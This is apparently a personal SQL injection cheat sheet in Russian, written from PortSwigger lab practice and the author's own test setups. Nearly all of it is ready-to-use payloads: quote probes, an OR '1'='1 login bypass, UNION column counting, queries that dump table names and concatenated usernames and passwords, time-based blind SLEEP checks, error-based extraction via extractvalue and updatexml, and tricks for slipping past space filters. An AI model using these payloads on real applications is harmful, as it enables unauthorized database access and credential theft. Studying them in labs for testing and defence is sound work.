# SQLi — шпаргалка

Всё проверял на лабах PortSwigger и своих стендах. Порядок действий один: сначала понять, где ломается запрос, потом уже думать, что тянуть.

## С чего начать

```
'            <- кавычка, смотрим ошибку
'-- -        <- если ответ нормальный — инъекция есть, хвост запроса в комментарии
' OR '1'='1   <- классика для обхода фильтров
```

Пробелы режут — пробовать `/**/`, перевод строки `%0a`, таб.

## Комментарии по СУБД

| СУБД | Комментарий |
|---|---|
| MySQL | `#`, `-- ` (пробел обязателен), `/*...*/` |
| PostgreSQL | `--`, `/*...*/` |
| Oracle | `--`, `/*...*/` |
| MSSQL | `--`, `/*...*/` |

## UNION: подгон под количество колонок

```
' ORDER BY 3-- -        <- растим цифру, пока не упадёт
' UNION SELECT NULL,NULL-- -
```

Тип колонки ловим по ошибке приведения — меняем NULL на 'a' по одной.

## Тянем данные (MySQL)

```sql
' UNION SELECT NULL,version()-- -
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,concat(username,0x3a,password) FROM users-- -
```

`0x3a` — двоеточие, чтобы не париться с кавычками внутри строки.

## Слепая: time-based

```
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
```

Дальше дедукция по символам. Утомительно. Sqlmap с `--level 3` часто сам не догоняет, где копать — руками быстрее бывает.

## Error-based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)),1)-- -
```

Единственный нормальный способ exfil на слепой, когда sleep блокируют.

## Нюансы, на которых спотыкался

- В некоторых лабах фильтр жрёт пробелы — выручил `/**/` между ключевыми словами.
- Ошибку БД иногда не рисуют на странице, но она есть в теле ответа — смотреть Burp, а не рендер в браузере.
- `UNION` требует совместимый тип в каждой колонке, иначе молчок без ошибки. Долго думал, что инъекции нет, а просто NULL не того типа стоял.
